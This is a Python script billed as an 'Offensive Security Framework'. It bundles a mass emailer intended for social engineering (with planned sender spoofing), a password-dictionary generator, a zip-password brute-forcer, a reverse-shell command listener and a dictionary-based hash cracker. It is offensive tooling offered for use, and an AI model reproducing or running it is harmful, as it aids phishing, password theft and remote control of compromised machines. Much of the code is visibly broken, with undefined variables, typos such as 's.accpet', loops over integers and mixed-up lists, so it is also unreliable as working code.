#Offensive Security Framework
#Made by Christian Krenzlin, Co-Founder of MonoSec
#Special Thanks to Albert Slepak for his help
import itertools
import math
import hashlib
import sys
import smtplib
import time
import getpass
import itertools
import zipfile
import socket
import os
import json
import requests
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


arr = ["print help docs"]



arr1 = []

#help menu
def OffsecHelpmenu():
    print("welcome to the help menu")
    print()
    for i in range(0,len()):
        print([i])


#command line menu
def OffsecMenu():
    print()
    print("Welcome to the world of Offensive Security:")
    print("1. Social Engineering")
    print("2. Dictionary Creation")
    print("3. Bruteforcing tool")
    print("4. Reverse shell")
    print("5. Hash cracking")
    print("88. Help")
    print("99. Exit")
    x = int(input("What option would you like to choose? "))
    if(x == 1):
        SocialEngineering()
    elif(x == 2):
        Dictionary()
    elif(x == 3):
        Brute()
    elif(x == 4):
        Reverse_Shell()
    elif(x == 5):
        HashCrack()
    elif(x == 88):
        OffsecHelpmenu()
        OffsecMenu()
    elif(x == 99):
        exit()

def geolocation():
    ip = input("Enter the IP you want to search for: ")
    r = requests.get("https://www.ipinfo.io/"+ip+"/geo")
    ret = r.text
    parsed = json.loads(ret)
    print()
    print("Here are the results")
    print("City: "+parsed["city"])
    print("Region: "+parsed["region"])
    print("Country: "+parsed["country"])


#social engienrring sub menu
def SocialEngineering():
    print("Welcome to the Social Engineering area of MSF")
    print("1. Mass emailer")
    print("2. IP Geolocation")

    x = int(input("Enter the number of your option: "))
    if(x == 1):
        MassEmailer()
    elif(x == 5):
        geolocation()
    else:
        print("Not an option")
        SocialEngineering()
#Outline for a mass emailer. Will add sender spoofing
def MassEmailer():
    list = input("Enter the filename for the email list")
    with open(list) as f:
        lines = [line.rstrip('\n') for line in open(list)]
    for i in lines:
        arr1.append(i)
    sender = input("Enter the sender address: ")
    provider = input("Enter the provider here: ")
    subject = input("Enter the subject of the email: ")
    prov_port = int(input("Enter the smtp port number for your provider: "))
    password = getpass.getpass()
    s = smtplib.SMTP(host=provider, port=prov_port)
    s.starttls()
    try:
        s.login(sender,password)
    except smtplib.SMTPException:
        print("Something went wrong....")
        time.sleep(1)
        MassEmailer()
    #message creation
    message = input("Enter the message body: ")
    for email in 1:
        msg = MIMEMultipart()
        msg['From']=sender
        msg['To']=to
        msg['Subject']=subject

    # add in the message body
        msg.attach(MIMEText(message, 'plain'))

    # send the message via the server set up earlier.
        s.send_message(msg)
        del msg
    s.quit()


def Dictionary():
    print("You chose the dictionary creation tool. With this tool, you can create a password dictionary with just a few base words")
    while True:
        try:
            list = input("Input your list name (has to be in the same directory as this): ")
            with open(list) as f:
                x = [line.rstrip('\n') for line in open(list)]
            break
        except OSError:
            print("This file cannot be opened")
    print()
    idx = int(input("How many words would you want combined?(max 4): "))
    while(idx > 4 or idx < 1 ):
        idx = int(input("How many words would you want combined?(max 4): "))
    dictExec(list,idx)
#Creates a password dictionary based off of wordlist with variable passsword depth
def dictExec(list,idx):
    x = 0
    with open(list) as f:
        lines = [line.rstrip('\n') for line in open(list)]
    for i in lines:
        print(str(x)+": "+i)
        arr1.append(i)
        x+=1
    print()
    print("Post value listing")
    print()
    y = 0
    if(idx == 2):
        for y in range(len(arr1)):
            for i in range(len(arr1)):
                print(arr1[y] + arr1[i])
    elif(idx == 3):
        for y in range(len(arr1)):
            for i in range(len(arr1)):
                for x in range(len(arr1)):
                    print(arr1[y]+arr1[i]+arr1[x])
    elif(idx == 4):
        for y in range(len(arr1)):
            for i in range(len(arr1)):
                for x in range(len(arr1)):
                    for z in range(len(arr1)):
                        print(arr1[y]+arr1[i]+arr1[x]+arr1[z])


def Brute():
    print("Welcome to the Bruteforce menu")
    print()
    print("1. Email bruteforce")
    print("2. ZIP bruteforce")
    x = int(input("Enter the number of your choice: "))
    if(x == 1):
        bfEmail()
    if(x == 2):
        bfZip()
#email brutefocing, will use proxies to bypass captchas (?)
def bfEmail():
    print()


#Shits broken my dude
#Dictionary attack to break .zip file passwords
def bfZip():
    pass_ay = []
    print("zip and dictionary file have to be in the same directory as this")
    zip = input("Enter the name of your zip file: ")
    dict = input("Enter the name of your dictionary: ")
    with zipfile.ZipFile(zip, 'r') as zf:
        print(zf.namelist())
        for filename in zf.namelist():
            with open(dict) as f:
                x = [line.rstrip('\n') for line in open(dict)]
            for pw in x:
                try:
                    zf.extractall(pwd=bytes(pw,'utf-8'))
                    print("Password found: "+pw)
                except:
                    print("Wrong password: "+pw)




#reverse shell Creation

def Reverse_Shell():
    def cSocket():
        try:
            global host
            global property
            global s
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            host = ""
            port = int(input("Enter the listener port: "))
            if port == "":
                cSocket()
        except socket.error as m:
            print("Socket error: "+str(m[0]))
    def bindSocket():
        try:
            print("Binding at port %s" %port)
            s.bind((host,port))
            s.listen(1)
        except socket.error as m:
            print("Socket error: "+str(m[0]))
            bindSocket()
    def aSocket():
        global c
        global a
        global h
        try:
            c,a = s.accpet()
            print("[!!!] Session is open at %s:%s" %(a[0],a[1]))
            print("\n")
            h = c.recv(1024)
            menu()
        except socket.error as m:
            print("Socket error: "+str(m[0]))
    def menu():
        while 9:
            cmd = input(str(a[0]) + "@" + str(h) + ">")
            if cmd == "exit":
                c.close()
                s.close()
                sys.exit()
            command = c.send(cmd)
            result = c.recv(16834)
            if result != hostname:
                print (result)
    def main():
        cSocket()
        bindSocket()
        aSocket()
    main()

#Inner menu for the hash cracker
def HashCrack():
    print("You chose the hash cracking tool. With this tool, you'll be able to reverse check hashes in order to crack hashed passwords")
    list = input("Input your list name (has to be in the same directory as this): ")
    hash = input("Enter the hash you want cracked: ")
    print()
    print("Available Algorithms:")
    print("1. md5")
    print("2. sha1")
    print("3. sha256")
    print("4. sha224")
    print("5. sha384")
    print("6. sha512")
    algorithm = int(input("Enter the number of the correct hashing algorithm: "))
    if(algorithm < 1 or algorithm > 6):
        print("Not a valid option")
        print()
        HashCrack()
    crackExec(list,hash,algorithm)

#Hash cracking by comparing hash values from word lists. Effective against 1 way hashes like SHA2 and SHA3
def crackExec(list,hash,algorithm):
    sentinel = hash
    with open(list) as f:
        lines = [line.rstrip('\n') for line in open(list)]
    for i in lines:
        arr1.append(i)
    if(algorithm == 1):
        found = False
        for i in range(len(arr1)):
            m = hashlib.md5(arr1[i].encode())
            if(m.hexdigest() == hash):
                print("The hash was found.The password is: "+arr1[i])
                found = True
                break
        if(not found):
            print("No passwords matched")

    elif(algorithm == 2):
        found = False
        for i in range(len(arr1)):
            m = hashlib.sha1(arr1[i].encode())
            if(m.hexdigest() == hash):
                print("The hash was found.The password is: "+arr1[i])
                found = True
                break
        if(not found):
            print("No passwords matched")
    elif(algorithm == 3):
        found = False
        for i in range(len(arr1)):
            m = hashlib.sha256(arr[i].encode())
            if(m.hexdigest() == hash):
                print("The hash was found.The password is: "+arr1[i])
                found = True
                break
        if(not found):
            print("No passwords matched")

    elif(algorithm == 4):
        found = False
        for i in range(len(arr)):
            m = hashlib.sha224(arr1[i].encode())
            if(m.hexdigest() == hash):
                print("The hash was found.The password is: "+arr1[i])
                found = True
                break
        if(not found):
            print("No passwords matched")
    elif(algorithm == 5):
        found = False
        for i in range(len(arr1)):
            m = hashlib.sha384(arr1[i].encode())
            if(m.hexdigest() == hash):
                print("The hash was found.The password is: "+arr1[i])
                found = True
                break
        if(not found):
            print("No passwords matched")
    elif(algorithm == 6):
        found = False
        for i in range(len(arr1)):
            m = hashlib.sha512(arr1[i].encode())
            if(m.hexdigest() == hash):
                print("The hash was found.The password is: "+arr1[i])
                found = True
                break
        if(not found):
            print("No passwords matched")
    else:
        print("Not a valid option")
        HashCrack()

OffsecMenu()
